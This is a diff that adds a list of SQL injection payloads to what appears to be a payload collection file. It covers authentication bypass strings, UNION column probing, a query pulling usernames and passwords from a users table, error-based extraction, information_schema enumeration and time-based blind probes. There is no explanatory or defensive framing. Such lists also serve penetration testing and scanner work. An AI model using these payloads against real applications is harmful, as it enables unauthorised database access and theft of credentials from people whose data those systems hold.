@@ -1,0 +1,20 @@
+# --- New SQLi Polyglot Payloads ---
+' OR 1=1 LIMIT 1--
+" OR ""="
+' OR ''='
+1' ORDER BY 1--
+1' ORDER BY 100--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+1; SELECT * FROM users--
+' UNION SELECT username,password FROM users--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' UNION SELECT 1,table_name FROM information_schema.tables--
+' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+1'; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+1' AND BENCHMARK(10000000,SHA1('test'))--
